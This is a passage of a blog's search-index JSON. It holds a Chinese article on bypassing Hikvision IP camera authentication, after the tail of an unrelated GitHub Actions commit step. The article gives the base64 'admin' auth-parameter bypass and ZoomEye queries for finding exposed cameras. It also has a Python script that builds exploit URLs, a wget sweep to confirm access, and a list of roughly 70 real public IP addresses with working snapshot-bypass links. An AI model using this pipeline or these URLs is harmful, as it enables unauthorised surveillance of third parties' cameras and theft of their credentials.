p;name:&amp;nbsp;Commit&amp;nbsp;files&amp;nbsp;continue-on-error:&amp;nbsp;True&amp;nbsp;run:&amp;nbsp;|&amp;nbsp;git&amp;nbsp;diff&amp;nbsp;git&amp;nbsp;config&amp;nbsp;--local&amp;nbsp;user.email&amp;nbsp;&quot;dr_hamilton@foxmail.com&quot;&amp;nbsp;git&amp;nbsp;config&amp;nbsp;--local&amp;nbsp;user.name&amp;nbsp;&quot;Ravello-H&quot;&amp;nbsp;git&amp;nbsp;add&amp;nbsp;-A&amp;nbsp;git&amp;nbsp;commit&amp;nbsp;-m&amp;nbsp;&quot;[RPageSearch]`date&amp;nbsp;&#39;+%Y-%m-%d&amp;nbsp;%H:%M:%S&#39;`&quot;&amp;nbsp;||&amp;nbsp;exit&amp;nbsp;git&amp;nbsp;status&amp;nbsp;git&amp;nbsp;push&amp;nbsp;-f&amp;nbsp;进阶&amp;nbsp;因为能提供索引文件，你可以据此生成其他文件。参照以下项目：&amp;nbsp;Github:RavelloH/local-feed-generation&amp;nbsp;依赖&amp;nbsp;Github:Cheeriojs/cheerio&amp;nbsp;","img":["/articles/20230812/rpagesearch-name.png","/articles/20230812/rpagesearch-link.png","/articles/20230812/rpagesearch-regular.png","/articles/20230812/rpagesearch-title.png"],"links":["https://github.com/ravelloh/RPageSearch","/articles/20220825/","https://github.com/ravelloh/RPageSearch","https://github.com/ravelloh/RPageSearch","https://github.com/RavelloH/RPageSearch/releases","/articles/","https://github.com/ravelloh/RPageSearch","https://ravelloh.top/","https://github.com/RavelloH/RTheme","https://github.com/RavelloH/RTheme","https://github.com/RavelloH/RTheme","https://github.com/RavelloH/local-feed-generation","https://github.com/cheeriojs/cheerio"]},{"name":"HikvisionIP摄像头后台绕过","url":"/articles/20221224/","time":"2022-12-24","class":["网络安全","技术"],"tag":["attack","json","monitor"],"title":["起因","漏洞介绍","实践","获得目标","格式重组","验证目标","后言"],"context":"&amp;nbsp;注:此漏洞已于2017年被修复。本文仅作为学习用途。&amp;nbsp;起因&amp;nbsp;最近在学校用Kali扫内网ms17-010的时候，发现扫了一大堆主机居然只扫出来两个，而且在攻击时发现的确没用。&amp;nbsp;诚然，永恒之蓝作为2017年的漏洞，早已在当时被紧急修复，五年过去依旧存在这个漏洞的Windows7设备已经寥寥无几了。但是在用nmap扫描时，我发现学校内有&amp;nbsp;Hikvision&amp;nbsp;IP&amp;nbsp;camera设备，大概都是2016年装上的，于是回家一查，果然存在一个后台绕过漏洞。&amp;nbsp;但是不巧的是，因为疫情封校还没法回去实践，于是在这里应用一下，看看公网上还有多少设备存在这漏洞。&amp;nbsp;漏洞介绍&amp;nbsp;//&amp;nbsp;摘抄自&amp;nbsp;packetstormsecurity&amp;nbsp;Hikvision&amp;nbsp;camera&amp;nbsp;API&amp;nbsp;includes&amp;nbsp;support&amp;nbsp;for&amp;nbsp;proprietary&amp;nbsp;HikCGI&amp;nbsp;protocol,&amp;nbsp;which&amp;nbsp;exposes&amp;nbsp;URI&amp;nbsp;endpoints&amp;nbsp;through&amp;nbsp;the&amp;nbsp;camera&#39;s&amp;nbsp;web&amp;nbsp;interface.&amp;nbsp;The&amp;nbsp;HikCGI&amp;nbsp;protocol&amp;nbsp;handler&amp;nbsp;checks&amp;nbsp;for&amp;nbsp;the&amp;nbsp;presence&amp;nbsp;of&amp;nbsp;a&amp;nbsp;parameter&amp;nbsp;named&amp;nbsp;&quot;auth&quot;&amp;nbsp;in&amp;nbsp;the&amp;nbsp;query&amp;nbsp;string&amp;nbsp;and&amp;nbsp;if&amp;nbsp;that&amp;nbsp;parameter&amp;nbsp;contains&amp;nbsp;a&amp;nbsp;base64-encoded&amp;nbsp;&quot;username:password&quot;&amp;nbsp;string,&amp;nbsp;the&amp;nbsp;HikCGI&amp;nbsp;API&amp;nbsp;call&amp;nbsp;assumes&amp;nbsp;the&amp;nbsp;idntity&amp;nbsp;of&amp;nbsp;the&amp;nbsp;specified&amp;nbsp;user.&amp;nbsp;The&amp;nbsp;password&amp;nbsp;is&amp;nbsp;ignored.&amp;nbsp;Virtually&amp;nbsp;all&amp;nbsp;Hikvision&amp;nbsp;products&amp;nbsp;come&amp;nbsp;with&amp;nbsp;a&amp;nbsp;superuser&amp;nbsp;account&amp;nbsp;named&amp;nbsp;&quot;admin&quot;,&amp;nbsp;which&amp;nbsp;can&amp;nbsp;be&amp;nbsp;easily&amp;nbsp;impersonated.&amp;nbsp;也就是说我们可以直接通过在链接后加入&amp;nbsp;&quot;?auth=&quot;+[base64编码的用户名:密码]的形式轻松绕过。这个&amp;nbsp;[base64编码的用户名:密码]仅需要用户名对应，密码是什么无所谓，所以我们可以直接随便加密一个：&amp;nbsp;admin:11&amp;nbsp;↓base64↓&amp;nbsp;YWRtaW46MTEK&amp;nbsp;也就是说，我们在需要权限的页面url上直接加入?auth=YWRtaW46MTEK就能绕过验证。这些url包括:&amp;nbsp;//&amp;nbsp;获取用户列表&amp;nbsp;http://camera.ip:port/Security/users?auth=YWRtaW46MTEK&amp;nbsp;//&amp;nbsp;获取快照&amp;nbsp;http://camera.ip:port/onvif-http/snapshot?auth=YWRtaW46MTEK&amp;nbsp;//&amp;nbsp;获得摄像头配置&amp;nbsp;http://camera.ip/System/configurationFile?auth=YWRtaW46MTEK&amp;nbsp;从结果上来看，获取用户列表的结果是这样的：&amp;nbsp;&lt;?xml&amp;nbsp;version=&quot;1.0&quot;&amp;nbsp;encoding=&quot;UTF-8&quot;?&gt;&amp;nbsp;&lt;UserList&amp;nbsp;version=&quot;1.0&quot;&amp;nbsp;xmlns=&quot;http://www.hikvision.com/ver10/XMLSchema&quot;&gt;&amp;nbsp;&lt;User&amp;nbsp;version=&quot;1.0&quot;&amp;nbsp;xmlns=&quot;http://www.hikvision.com/ver10/XMLSchema&quot;&gt;&amp;nbsp;&lt;id&gt;1&lt;/id&gt;&amp;nbsp;&lt;userName&gt;admin&lt;/userName&gt;&amp;nbsp;&lt;priority&gt;high&lt;/priority&gt;&amp;nbsp;&lt;ipAddress&gt;0.0.0.0&lt;/ipAddress&gt;&amp;nbsp;&lt;macAddress&gt;00:00:00:00:00:00&lt;/macAddress&gt;&amp;nbsp;&lt;userLevel&gt;Administrator&lt;/userLevel&gt;&amp;nbsp;&lt;/User&gt;&amp;nbsp;&lt;/UserList&gt;&amp;nbsp;获取快照则会得到当前截图：&amp;nbsp;而获得配置则会直接得到一份当前摄像头的配置情况，包括账号密码。&amp;nbsp;值得注意的是，这里的配置其实也简单加密了一下，实际上的密钥似乎是abcdefg，不过这不难解决，在github上就有相关的解密工具。&amp;nbsp;Github@WormChickenWizard/hikvision-decrypter&amp;nbsp;解密前它是一个二进制文件，解密后它同样也是一个二进制文件，不过解密后可以直接用Hex编辑器搜索&amp;nbsp;admin，密码就在它的下两行。&amp;nbsp;实践&amp;nbsp;获得目标&amp;nbsp;这里借助zoomeye的命令行插件请求，方便后续的数据导出。(网页版zoomeye导出数据需会员)&amp;nbsp;可自Github下载:&amp;nbsp;Github@knownsec/ZoomEye-python&amp;nbsp;首先需要配置这个命令行工具，这里略，因为在Github仓库内有详细的中文文档说明。仅需填入API&amp;nbsp;key即可。&amp;nbsp;之后我们就可以使用这个搜索了，例子如下:&amp;nbsp;zoomeye&amp;nbsp;search&amp;nbsp;&#39;iconhash:&amp;nbsp;&quot;89b932fcc47cf4ca3faadb0cfdef89cf&quot;&amp;nbsp;+2016&amp;nbsp;+country:&quot;CN&quot;&amp;nbsp;+after:&quot;2021-12-22&quot;&amp;nbsp;+app:&quot;Hikvision&amp;nbsp;IP&amp;nbsp;camera&amp;nbsp;httpd&quot;&#39;&amp;nbsp;-num&amp;nbsp;20&amp;nbsp;正确执行后，输出应该类似这样：&amp;nbsp;解析一下以上搜索的命令:&amp;nbsp;网站图标&amp;nbsp;-&amp;nbsp;&#39;iconhash:&amp;nbsp;&quot;89b932fcc47cf4ca3faadb0cfdef89cf&quot;&amp;nbsp;(Hikvision监控页面图标)&amp;nbsp;监控年份&amp;nbsp;-&amp;nbsp;2016&amp;nbsp;(此漏洞2017得到修复，我们往前推一年，成功率比较大)&amp;nbsp;索引国家&amp;nbsp;-&amp;nbsp;country:&quot;CN&quot;&amp;nbsp;(自家兄弟，速度快)&amp;nbsp;索引时间&amp;nbsp;-&amp;nbsp;after:&quot;2021-12-22&quot;&amp;nbsp;(索引最近一年的数据)&amp;nbsp;索引类型&amp;nbsp;-&amp;nbsp;app:&quot;Hikvision&amp;nbsp;IP&amp;nbsp;camera&amp;nbsp;httpd&quot;&amp;nbsp;(只索引这个IP摄像头)&amp;nbsp;查找数量&amp;nbsp;-&amp;nbsp;-num&amp;nbsp;20&amp;nbsp;(测试用，仅查找20个，悠着点用，免费版每个月只有10000次)&amp;nbsp;这就八九不离十了，如果需要更进一步还可以加上额外选项，如city:&quot;shanghai&quot;等等，详见zoomeye官网。&amp;nbsp;接下来就是导出，因为工具本来就有-save选项，十分简单&amp;nbsp;zoomeye&amp;nbsp;search&amp;nbsp;&#39;iconhash:&amp;nbsp;&quot;89b932fcc47cf4ca3faadb0cfdef89cf&quot;&amp;nbsp;+2016&amp;nbsp;+country:&quot;CN&quot;&amp;nbsp;+after:&quot;2021-12-22&quot;&amp;nbsp;+app:&quot;Hikvision&amp;nbsp;IP&amp;nbsp;camera&amp;nbsp;httpd&quot;&#39;&amp;nbsp;-num&amp;nbsp;1000&amp;nbsp;-save&amp;nbsp;port&amp;nbsp;这里唯一增加的选项是&amp;nbsp;-save&amp;nbsp;port，表示额外存储端口(默认必存IP)，另外将数量至1000，有需要也可以设置多一些。&amp;nbsp;不过因为导出是每次请求20个结果的缘故需要时间，等待导出即可。&amp;nbsp;导出的结果如下:&amp;nbsp;{&#39;ip&#39;:&amp;nbsp;&#39;221.0.16.166&#39;,&amp;nbsp;&#39;port&#39;:&amp;nbsp;8808}&amp;nbsp;{&#39;ip&#39;:&amp;nbsp;&#39;60.216.142.12&#39;,&amp;nbsp;&#39;port&#39;:&amp;nbsp;8808}&amp;nbsp;{&#39;ip&#39;:&amp;nbsp;&#39;27.211.181.181&#39;,&amp;nbsp;&#39;port&#39;:&amp;nbsp;8808}&amp;nbsp;{&#39;ip&#39;:&amp;nbsp;&#39;61.132.107.234&#39;,&amp;nbsp;&#39;port&#39;:&amp;nbsp;32400}&amp;nbsp;{&#39;ip&#39;:&amp;nbsp;&#39;111.23.146.92&#39;,&amp;nbsp;&#39;port&#39;:&amp;nbsp;32400}&amp;nbsp;{&#39;ip&#39;:&amp;nbsp;&#39;113.234.39.166&#39;,&amp;nbsp;&#39;port&#39;:&amp;nbsp;995}&amp;nbsp;{&#39;ip&#39;:&amp;nbsp;&#39;112.232.246.135&#39;,&amp;nbsp;&#39;port&#39;:&amp;nbsp;8808}&amp;nbsp;{&#39;ip&#39;:&amp;nbsp;&#39;112.232.247.90&#39;,&amp;nbsp;&#39;port&#39;:&amp;nbsp;8808}&amp;nbsp;{&#39;ip&#39;:&amp;nbsp;&#39;39.71.193.248&#39;,&amp;nbsp;&#39;port&#39;:&amp;nbsp;8808}&amp;nbsp;{&#39;ip&#39;:&amp;nbsp;&#39;39.71.192.8&#39;,&amp;nbsp;&#39;port&#39;:&amp;nbsp;8808}&amp;nbsp;{&#39;ip&#39;:&amp;nbsp;&#39;114.33.140.212&#39;,&amp;nbsp;&#39;port&#39;:&amp;nbsp;8883}&amp;nbsp;{&#39;ip&#39;:&amp;nbsp;&#39;137.189.185.154&#39;,&amp;nbsp;&#39;port&#39;:&amp;nbsp;8005}&amp;nbsp;{&#39;ip&#39;:&amp;nbsp;&#39;182.135.224.187&#39;,&amp;nbsp;&#39;port&#39;:&amp;nbsp;8005}&amp;nbsp;{&#39;ip&#39;:&amp;nbsp;&#39;112.240.5.75&#39;,&amp;nbsp;&#39;port&#39;:&amp;nbsp;8005}&amp;nbsp;{&#39;ip&#39;:&amp;nbsp;&#39;1.65.200.1&#39;,&amp;nbsp;&#39;port&#39;:&amp;nbsp;8883}&amp;nbsp;{&#39;ip&#39;:&amp;nbsp;&#39;114.246.201.88&#39;,&amp;nbsp;&#39;port&#39;:&amp;nbsp;88}&amp;nbsp;{&#39;ip&#39;:&amp;nbsp;&#39;114.246.216.66&#39;,&amp;nbsp;&#39;port&#39;:&amp;nbsp;88}&amp;nbsp;{&#39;ip&#39;:&amp;nbsp;&#39;119.145.77.202&#39;,&amp;nbsp;&#39;port&#39;:&amp;nbsp;88}&amp;nbsp;{&#39;ip&#39;:&amp;nbsp;&#39;182.84.45.51&#39;,&amp;nbsp;&#39;port&#39;:&amp;nbsp;88}&amp;nbsp;{&#39;ip&#39;:&amp;nbsp;&#39;122.247.197.186&#39;,&amp;nbsp;&#39;port&#39;:&amp;nbsp;88}&amp;nbsp;{&#39;ip&#39;:&amp;nbsp;&#39;122.244.52.251&#39;,&amp;nbsp;&#39;port&#39;:&amp;nbsp;88}&amp;nbsp;{&#39;ip&#39;:&amp;nbsp;&#39;122.240.1.130&#39;,&amp;nbsp;&#39;port&#39;:&amp;nbsp;88}&amp;nbsp;{&#39;ip&#39;:&amp;nbsp;&#39;122.245.80.91&#39;,&amp;nbsp;&#39;port&#39;:&amp;nbsp;88}&amp;nbsp;{&#39;ip&#39;:&amp;nbsp;&#39;122.240.204.77&#39;,&amp;nbsp;&#39;port&#39;:&amp;nbsp;88}&amp;nbsp;......&amp;nbsp;格式重组&amp;nbsp;接下来就是去验证每个IP是否有效。&amp;nbsp;我这里是采用获取快照的方式，可以方便的用wget的--spider模式确认是否能访问到快照。&amp;nbsp;那么就需要先去得到有效的url，在上面zoomeye导出的时候会生成一个json，我们在这里可以直接每行解析一下，将完成结果写入到另一个文件中。&amp;nbsp;#&amp;nbsp;python&amp;nbsp;3&amp;nbsp;#&amp;nbsp;-*-&amp;nbsp;coding:&amp;nbsp;utf-8&amp;nbsp;-*-&amp;nbsp;import&amp;nbsp;os&amp;nbsp;import&amp;nbsp;time&amp;nbsp;from&amp;nbsp;datetime&amp;nbsp;import&amp;nbsp;datetime&amp;nbsp;import&amp;nbsp;json&amp;nbsp;urls0&amp;nbsp;=&amp;nbsp;&#39;https://&#39;&amp;nbsp;urls1&amp;nbsp;=&amp;nbsp;&#39;http://&#39;&amp;nbsp;urls3&amp;nbsp;=&amp;nbsp;&#39;/onvif-http/snapshot?auth=YWRtaW46MTEK&#39;&amp;nbsp;#&amp;nbsp;初始化&amp;nbsp;startTime&amp;nbsp;=&amp;nbsp;time.localtime()&amp;nbsp;startDateTime&amp;nbsp;=&amp;nbsp;datetime.now()&amp;nbsp;print(&#39;[初始化进程运行]&amp;nbsp;-&amp;nbsp;&#39;+time.strftime(&quot;%H:%M:%S&quot;,time.localtime()))&amp;nbsp;if&amp;nbsp;&#39;targets.json&#39;&amp;nbsp;in&amp;nbsp;os.listdir(&#39;.&#39;):&amp;nbsp;with&amp;nbsp;open(r&#39;./targets.json&#39;,&#39;r&#39;)&amp;nbsp;as&amp;nbsp;fp:&amp;nbsp;l1&amp;nbsp;=&amp;nbsp;fp.readlines()&amp;nbsp;print(f&#39;&amp;nbsp;检测到目标，共载入{len(l1)}个数据&#39;)&amp;nbsp;else:&amp;nbsp;print(&#39;[Error]未检测到targets.json，无目标&#39;)&amp;nbsp;exit()&amp;nbsp;print(&#39;[主进程运行]&#39;)&amp;nbsp;for&amp;nbsp;i&amp;nbsp;in&amp;nbsp;range(len(l1)):&amp;nbsp;jsons&amp;nbsp;=&amp;nbsp;json.loads(str(l1[i]).replace(&#39;\\n&#39;,&#39;&#39;).replace(&#39;\\&#39;&#39;,&#39;&quot;&#39;))&amp;nbsp;url2&amp;nbsp;=&amp;nbsp;str(jsons[&#39;ip&#39;])+&#39;:&#39;+str(jsons[&#39;port&#39;])&amp;nbsp;with&amp;nbsp;open(r&#39;./ok.info&#39;,&#39;a&#39;)&amp;nbsp;as&amp;nbsp;f2:&amp;nbsp;f2.write(urls1+url2+urls3+&#39;\\n&#39;)&amp;nbsp;print(&#39;\\r&#39;+time.strftime(&quot;%H:%M:%S&quot;,time.localtime())+&#39;»&amp;nbsp;总进度:[&#39;+&#39;|&#39;*(i//(len(l1)//50)+1)+&#39;&amp;nbsp;&#39;*(50-(i//(len(l1)//50))-1)+&#39;]&#39;+str(i)+&#39;/&#39;+str(len(l1))+&#39;&amp;nbsp;-&amp;nbsp;&#39;+str(round(float((i/len(l1)))*100,2))+&#39;%&#39;)&amp;nbsp;上面这个python小程序会把它所在文件夹内的&amp;nbsp;targets.json中的全部ip转换为url形式存储在&amp;nbsp;result.txt中，每行一个：&amp;nbsp;http://221.0.16.166:8808/onvif-http/snapshot?auth=YWRtaW46MTEK&amp;nbsp;http://60.216.142.12:8808/onvif-http/snapshot?auth=YWRtaW46MTEK&amp;nbsp;http://27.211.181.181:8808/onvif-http/snapshot?auth=YWRtaW46MTEK&amp;nbsp;http://61.132.107.234:32400/onvif-http/snapshot?auth=YWRtaW46MTEK&amp;nbsp;http://111.23.146.92:32400/onvif-http/snapshot?auth=YWRtaW46MTEK&amp;nbsp;http://113.234.39.166:995/onvif-http/snapshot?auth=YWRtaW46MTEK&amp;nbsp;http://112.232.246.135:8808/onvif-http/snapshot?auth=YWRtaW46MTEK&amp;nbsp;http://112.232.247.90:8808/onvif-http/snapshot?auth=YWRtaW46MTEK&amp;nbsp;http://39.71.193.248:8808/onvif-http/snapshot?auth=YWRtaW46MTEK&amp;nbsp;http://39.71.192.8:8808/onvif-http/snapshot?auth=YWRtaW46MTEK&amp;nbsp;http://114.33.140.212:8883/onvif-http/snapshot?auth=YWRtaW46MTEK&amp;nbsp;http://137.189.185.154:8005/onvif-http/snapshot?auth=YWRtaW46MTEK&amp;nbsp;http://182.135.224.187:8005/onvif-http/snapshot?auth=YWRtaW46MTEK&amp;nbsp;http://112.240.5.75:8005/onvif-http/snapshot?auth=YWRtaW46MTEK&amp;nbsp;http://1.65.200.1:8883/onvif-http/snapshot?auth=YWRtaW46MTEK&amp;nbsp;http://114.246.201.88:88/onvif-http/snapshot?auth=YWRtaW46MTEK&amp;nbsp;http://114.246.216.66:88/onvif-http/snapshot?auth=YWRtaW46MTEK&amp;nbsp;http://119.145.77.202:88/onvif-http/snapshot?auth=YWRtaW46MTEK&amp;nbsp;http://182.84.45.51:88/onvif-http/snapshot?auth=YWRtaW46MTEK&amp;nbsp;http://122.247.197.186:88/onvif-http/snapshot?auth=YWRtaW46MTEK&amp;nbsp;http://122.244.52.251:88/onvif-http/snapshot?auth=YWRtaW46MTEK&amp;nbsp;http://122.240.1.130:88/onvif-http/snapshot?auth=YWRtaW46MTEK&amp;nbsp;http://122.245.80.91:88/onvif-http/snapshot?auth=YWRtaW46MTEK&amp;nbsp;http://122.240.204.77:88/onvif-http/snapshot?auth=YWRtaW46MTEK&amp;nbsp;......&amp;nbsp;这样的格式就让我们看起来很舒服了，接下来就可以用wget去逐一验证:&amp;nbsp;验证目标&amp;nbsp;wget&amp;nbsp;--tries&amp;nbsp;1&amp;nbsp;--timeout&amp;nbsp;1&amp;nbsp;-nv&amp;nbsp;-o&amp;nbsp;data.log&amp;nbsp;--spider&amp;nbsp;-i&amp;nbsp;result.txt&amp;nbsp;此操作将静默进行，结果会用wget的简洁模式存储在data.log中，方便我们检索。&amp;nbsp;上面设置的超时时间与超时重试次数都是1，耗时较短，如果有耐心可以设置大一点。&amp;nbsp;完成后，data.log中的结果应该如下:&amp;nbsp;failed:&amp;nbsp;Connection&amp;nbsp;timed&amp;nbsp;out.&amp;nbsp;2022-12-23&amp;nbsp;18:05:11&amp;nbsp;URL:&amp;nbsp;http://39.89.12.34:88/onvif-http/snapshot?auth=YWRtaW46MTEK&amp;nbsp;200&amp;nbsp;OK&amp;nbsp;failed:&amp;nbsp;Connection&amp;nbsp;timed&amp;nbsp;out.&amp;nbsp;Username/Password&amp;nbsp;Authentication&amp;nbsp;Failed.&amp;nbsp;failed:&amp;nbsp;Connection&amp;nbsp;timed&amp;nbsp;out.&amp;nbsp;failed:&amp;nbsp;Connection&amp;nbsp;timed&amp;nbsp;out.&amp;nbsp;Read&amp;nbsp;error&amp;nbsp;(Connection&amp;nbsp;timed&amp;nbsp;out)&amp;nbsp;in&amp;nbsp;headers.&amp;nbsp;failed:&amp;nbsp;Connection&amp;nbsp;timed&amp;nbsp;out.&amp;nbsp;Username/Password&amp;nbsp;Authentication&amp;nbsp;Failed.&amp;nbsp;failed:&amp;nbsp;Connection&amp;nbsp;timed&amp;nbsp;out.&amp;nbsp;failed:&amp;nbsp;Connection&amp;nbsp;timed&amp;nbsp;out.&amp;nbsp;failed:&amp;nbsp;Connection&amp;nbsp;timed&amp;nbsp;out.&amp;nbsp;Username/Password&amp;nbsp;Authentication&amp;nbsp;Failed.&amp;nbsp;failed:&amp;nbsp;Connection&amp;nbsp;timed&amp;nbsp;out.&amp;nbsp;failed:&amp;nbsp;Connection&amp;nbsp;refused.&amp;nbsp;2022-12-23&amp;nbsp;18:05:36&amp;nbsp;URL:&amp;nbsp;http://27.223.48.100:88/onvif-http/snapshot?auth=YWRtaW46MTEK&amp;nbsp;200&amp;nbsp;OK&amp;nbsp;failed:&amp;nbsp;Connection&amp;nbsp;timed&amp;nbsp;out.&amp;nbsp;failed:&amp;nbsp;Connection&amp;nbsp;refused.&amp;nbsp;failed:&amp;nbsp;Connection&amp;nbsp;timed&amp;nbsp;out.&amp;nbsp;failed:&amp;nbsp;Connection&amp;nbsp;refused.&amp;nbsp;failed:&amp;nbsp;Connection&amp;nbsp;refused.&amp;nbsp;Username/Password&amp;nbsp;Authentication&amp;nbsp;Failed.&amp;nbsp;2022-12-23&amp;nbsp;18:05:39&amp;nbsp;URL:&amp;nbsp;http://221.215.171.198:81/onvif-http/snapshot?auth=YWRtaW46MTEK&amp;nbsp;200&amp;nbsp;OK&amp;nbsp;failed:&amp;nbsp;Connection&amp;nbsp;refused.&amp;nbsp;......&amp;nbsp;可以看到，能成功访问的url都有200标识，逐一解释一下其余的:&amp;nbsp;failed:&amp;nbsp;Connection&amp;nbsp;timed&amp;nbsp;out.&amp;nbsp;-&amp;nbsp;无法连接&amp;nbsp;Read&amp;nbsp;error&amp;nbsp;(Connection&amp;nbsp;timed&amp;nbsp;out)&amp;nbsp;in&amp;nbsp;headers.&amp;nbsp;-&amp;nbsp;无法连接&amp;nbsp;failed:&amp;nbsp;Connection&amp;nbsp;refused.&amp;nbsp;-&amp;nbsp;可以连接，但不存在此漏洞&amp;nbsp;Username/Password&amp;nbsp;Authentication&amp;nbsp;Failed.&amp;nbsp;-&amp;nbsp;存在此漏洞，但默认用户名不是admin&amp;nbsp;为了方便我们进一步处理，用正则表达式替换以下字符为空:&amp;nbsp;//&amp;nbsp;以下不需要使用正则表达式&amp;nbsp;Username/Password&amp;nbsp;Authentication&amp;nbsp;Failed.&amp;nbsp;failed:&amp;nbsp;Connection&amp;nbsp;timed&amp;nbsp;out.&amp;nbsp;failed:&amp;nbsp;Connection&amp;nbsp;refused.&amp;nbsp;Read&amp;nbsp;error&amp;nbsp;(Connection&amp;nbsp;timed&amp;nbsp;out)&amp;nbsp;in&amp;nbsp;headers.&amp;nbsp;Remote&amp;nbsp;file&amp;nbsp;does&amp;nbsp;not&amp;nbsp;exist&amp;nbsp;--&amp;nbsp;broken&amp;nbsp;link!!!&amp;nbsp;200&amp;nbsp;OK&amp;nbsp;//&amp;nbsp;以下需要使用正则表达式&amp;nbsp;^.*:$&amp;nbsp;//&amp;nbsp;去除坏链&amp;nbsp;[0-9]*-[0-9]*-[0-9]*&amp;nbsp;[0-9]*:[0-9]*:[0-9]*&amp;nbsp;URL:&amp;nbsp;//去除时间&amp;nbsp;[&amp;nbsp;\\t\\n]*$&amp;nbsp;//去除空行&amp;空格&amp;nbsp;不出意外的话，最后留下的就是存在漏洞的链接了。&amp;nbsp;我这里试了一下，1000个ip中大概有70个存在此漏洞，也就是7%吧&amp;nbsp;附最终结果：&amp;nbsp;http://221.0.16.166:8808/onvif-http/snapshot?auth=YWRtaW46MTEK&amp;nbsp;http://27.211.181.181:8808/onvif-http/snapshot?auth=YWRtaW46MTEK&amp;nbsp;http://137.189.185.154:8005/onvif-http/snapshot?auth=YWRtaW46MTEK&amp;nbsp;http://114.246.216.66:88/onvif-http/snapshot?auth=YWRtaW46MTEK&amp;nbsp;http://116.132.38.26:88/onvif-http/snapshot?auth=YWRtaW46MTEK&amp;nbsp;http://61.155.60.154:88/onvif-http/snapshot?auth=YWRtaW46MTEK&amp;nbsp;http://111.17.186.222:88/onvif-http/snapshot?auth=YWRtaW46MTEK&amp;nbsp;http://60.211.176.138:88/onvif-http/snapshot?auth=YWRtaW46MTEK&amp;nbsp;http://139.170.232.34:88/onvif-http/snapshot?auth=YWRtaW46MTEK&amp;nbsp;http://60.29.192.154:88/onvif-http/snapshot?auth=YWRtaW46MTEK&amp;nbsp;http://218.17.121.235:88/onvif-http/snapshot?auth=YWRtaW46MTEK&amp;nbsp;http://222.135.125.233:88/onvif-http/snapshot?auth=YWRtaW46MTEK&amp;nbsp;http://120.211.63.194:88/onvif-http/snapshot?auth=YWRtaW46MTEK&amp;nbsp;http://120.236.75.243:88/onvif-http/snapshot?auth=YWRtaW46MTEK&amp;nbsp;http://115.238.136.42:88/onvif-http/snapshot?auth=YWRtaW46MTEK&amp;nbsp;http://39.89.12.34:88/onvif-http/snapshot?auth=YWRtaW46MTEK&amp;nbsp;http://27.9.47.186:88/onvif-http/snapshot?auth=YWRtaW46MTEK&amp;nbsp;http://220.132.146.242:88/onvif-http/snapshot?auth=YWRtaW46MTEK&amp;nbsp;http://110.167.76.104:88/onvif-http/snapshot?auth=YWRtaW46MTEK&amp;nbsp;http://112.16.175.58:88/onvif-http/snapshot?auth=YWRtaW46MTEK&amp;nbsp;http://222.184.120.162:88/onvif-http/snapshot?auth=YWRtaW46MTEK&amp;nbsp;http://119.120.224.118:88/onvif-http/snapshot?auth=YWRtaW46MTEK&amp;nbsp;http://180.161.47.184:88/onvif-http/snapshot?auth=YWRtaW46MTEK&amp;nbsp;http://180.161.91.12:88/onvif-http/snapshot?auth=YWRtaW46MTEK&amp;nbsp;http://211.140.148.199:88/onvif-http/snapshot?auth=YWRtaW46MTEK&amp;nbsp;http://211.143.231.238:88/onvif-http/snapshot?auth=YWRtaW46MTEK&amp;nbsp;http://223.68.200.14:88/onvif-http/snapshot?auth=YWRtaW46MTEK&amp;nbsp;http://114.218.22.55:88/onvif-http/snapshot?auth=YWRtaW46MTEK&amp;nbsp;http://59.173.49.211:88/onvif-http/snapshot?auth=YWRtaW46MTEK&amp;nbsp;http://119.1.107.250:88/onvif-http/snapshot?auth=YWRtaW46MTEK&amp;nbsp;http://27.200.21.66:88/onvif-http/snapshot?auth=YWRtaW46MTEK&amp;nbsp;http://27.196.174.10:88/onvif-http/snapshot?auth=YWRtaW46MTEK&amp;nbsp;http://103.100.64.75:88/onvif-http/snapshot?auth=YWRtaW46MTEK&amp;nbsp;http://180.158.150.171:88/onvif-http/snapshot?auth=YWRtaW46MTEK&amp;nbsp;http://218.203.76.97:88/onvif-http/snapshot?auth=YWRtaW46MTEK&amp;nbsp;http://117.86.108.6:88/onvif-http/snapshot?auth=YWRtaW46MTEK&amp;nbsp;http://116.232.75.214:88/onvif-http/snapshot?auth=YWRtaW46MTEK&amp;nbsp;http://116.230.31.118:88/onvif-http/snapshot?auth=YWRtaW46MTEK&amp;nbsp;http://125.123.232.251:88/onvif-http/snapshot?auth=YWRtaW46MTEK&amp;nbsp;http://183.214.115.6:88/onvif-http/snapshot?auth=YWRtaW46MTEK&amp;nbsp;http://101.74.233.94:88/onvif-http/snapshot?auth=YWRtaW46MTEK&amp;nbsp;http://180.165.218.224:88/onvif-http/snapshot?auth=YWRtaW46MTEK&amp;nbsp;http://114.88.37.77:88/onvif-http/snapshot?auth=YWRtaW46MTEK&amp;nbsp;http://114.95.248.231:88/onvif-http/snapshot?auth=YWRtaW46MTEK&amp;nbsp;http://220.178.172.134:88/onvif-http/snapshot?auth=YWRtaW46MTEK&amp;nbsp;http://220.180.211.97:88/onvif-http/snapshot?auth=YWRtaW46MTEK&amp;nbsp;http://124.77.94.21:88/onvif-http/snapshot?auth=YWRtaW46MTEK&amp;nbsp;http://114.233.4.106:88/onvif-http/snapshot?auth=YWRtaW46MTEK&amp;nbsp;http://114.231.243.80:88/onvif-http/snapshot?auth=YWRtaW46MTEK&amp;nbsp;http://125.90.3.102:88/onvif-http/snapshot?auth=YWRtaW46MTEK&amp;nbsp;http://125.95.237.71:88/onvif-http/snapshot?auth=YWRtaW46MTEK&amp;nbsp;http://14.120.74.123:88/onvif-http/snapshot?auth=YWRtaW46MTEK&amp;nbsp;http://223.82.14.139:88/onvif-http/snapshot?auth=YWRtaW46MTEK&amp;nbsp;http://223.94.87.221:88/onvif-http/snapshot?auth=YWRtaW46MTEK&amp;nbsp;http://223.94.87.221:88/onvif-http/snapshot?auth=YWRtaW46MTEK&amp;nbsp;http://223.82.36.194:88/onvif-http/snapshot?auth=YWRtaW46MTEK&amp;nbsp;http://116.11.185.163:88/onvif-http/snapshot?auth=YWRtaW46MTEK&amp;nbsp;http://183.250.109.133:88/onvif-http/snapshot?auth=YWRtaW46MTEK&amp;nbsp;http://183.250.246.173:88/onvif-http/snapshot?auth=YWRtaW46MTEK&amp;nbsp;http://183.247.200.105:88/onvif-http/snapshot?auth=YWRtaW46MTEK&amp;nbsp;http://183.248.215.239:88/onvif-http/snapshot?auth=YWRtaW46MTEK&amp;nbsp;http://183.196.178.34:88/onvif-http/snapshot?auth=YWRtaW46MTEK&amp;nbsp;http://115.171.0.224:88/onvif-http/snapshot?auth=YWRtaW46MTEK&amp;nbsp;http://183.233.250.61:88/onvif-http/snapshot?